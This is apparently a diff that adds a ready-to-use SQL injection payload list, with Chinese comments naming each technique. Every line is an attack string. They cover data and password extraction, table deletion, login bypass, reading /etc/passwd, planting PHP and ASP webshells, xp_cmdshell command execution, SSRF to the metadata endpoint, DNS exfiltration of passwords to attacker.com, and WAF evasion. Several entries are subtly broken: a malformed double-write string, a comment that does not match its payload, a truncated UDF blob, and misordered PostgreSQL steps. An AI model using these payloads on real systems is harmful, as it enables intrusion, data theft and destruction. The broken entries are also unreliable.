@@ -1,0 +1,48 @@
+# SQL 注入 - 联合查询注入（提取数据库版本、用户名、表名）
+' UNION SELECT 1,version(),user(),database(),5-- -
+# SQL 注入 - 报错注入（通过报错泄露数据）
+' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT(version(),0x3a,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a) AND '1'='1
+# SQL 注入 - 时间盲注（延时5秒）
+' AND (SELECT SLEEP(5))--
+# SQL 注入 - 堆叠查询（删表）
+'; DROP TABLE users--
+# SQL 注入 - 万能密码绕过登录
+' OR '1'='1'--
+# SQL 注入 - 布尔盲注（逐字符猜解管理员密码）
+' AND SUBSTRING((SELECT password FROM users WHERE username='admin' LIMIT 1),1,1)='a'--
+# SQL 注入 - 读取系统文件 (/etc/passwd)
+' UNION SELECT LOAD_FILE('/etc/passwd'),2,3,4,5--
+# SQL 注入 - 写入 Webshell 到 Web 目录
+' UNION SELECT 1,'<?php system($_GET["cmd"]);?>',3,4,5 INTO OUTFILE '/var/www/html/shell.php'--
+# SQL 注入 - 注入绕过空格过滤 (注释符替代空格)
+'/**/OR/**/1=1/**/--
+# SQL 注入 - 双写绕过关键字过滤提取数据
+' UNIUNIONSELECTON SELECT user(),database(),version(),4,5--
+# SQL 注入 - 宽字节注入绕过转义 (GBK)
+%df' OR 1=1--
+# SQL 注入 - PostgreSQL COPY 命令写入文件 RCE
+'; COPY (SELECT '<?php system($_GET["cmd"]);?>') TO '/var/www/html/pg.php'--
+# SQL 注入 - MSSQL xp_cmdshell 执行系统命令
+'; EXEC xp_cmdshell('whoami')--
+# SQL 注入 - MSSQL sp_OACreate 写入文件 Getshell
+'; DECLARE @o INT; EXEC sp_OACreate 'Scripting.FileSystemObject',@o OUT; EXEC sp_OAMethod @o,'CreateTextFile',NULL,'C:\inetpub\wwwroot\shell.asp'; EXEC sp_OAMethod @o,'WriteLine',NULL,'<% Execute(Request("cmd")) %>'--
+# SQL 注入 - Oracle UTL_HTTP SSRF 攻击内网
+' UNION SELECT UTL_HTTP.REQUEST('http://169.254.169.254/latest/meta-data/') FROM dual--
+# SQL 注入 - DNS 带外数据泄露 (MySQL load_file + DNS)
+' UNION SELECT LOAD_FILE(CONCAT('\\\\',(SELECT password FROM users LIMIT 1),'.attacker.com\\a'))--
+# SQL 注入 - 科学计数法绕过 WAF (等价于 1=1)
+' OR 1.e(1)=1.e(1)--
+# SQL 注入 - 十六进制编码绕过 WAF 关键字检测
+' UNION SELECT 0x61646d696e,2,3,4,5--
+# SQL 注入 - 内联注释绕过 WAF 关键字检测提取数据
+' /*!UNION*/ /*!SELECT*/ user(),database(),version(),4,5--
+# SQL 注入 - 百分号绕过 WAF (MySQL # 替换 -- 注释)
+' UNION SELECT 1,2,3,4 FROM dual WHERE 1=1 AND 2344=2344 AND '1q'='1q
+# SQL 注入 - ORDER BY 注入提取表名列名
+' ORDER BY (SELECT 1 FROM information_schema.columns WHERE table_name='users' AND column_name='password')--
+# SQL 注入 - GROUP BY 注入提取数据
+' GROUP BY (SELECT password FROM users WHERE username='admin')--
+# SQL 注入 - MySQL UDF 动态库写入提权 RCE
+' UNION SELECT 0x7F454C46...,2,3,4,5 INTO DUMPFILE '/usr/lib/mysql/plugin/udf.so'--
+# SQL 注入 - PostgreSQL 大对象写入文件 RCE
+'; SELECT lo_export(lo_create(99999),'/var/www/html/lo.php'); INSERT INTO pg_largeobject VALUES (99999,0,'<?php system($_GET[1]);?>')--
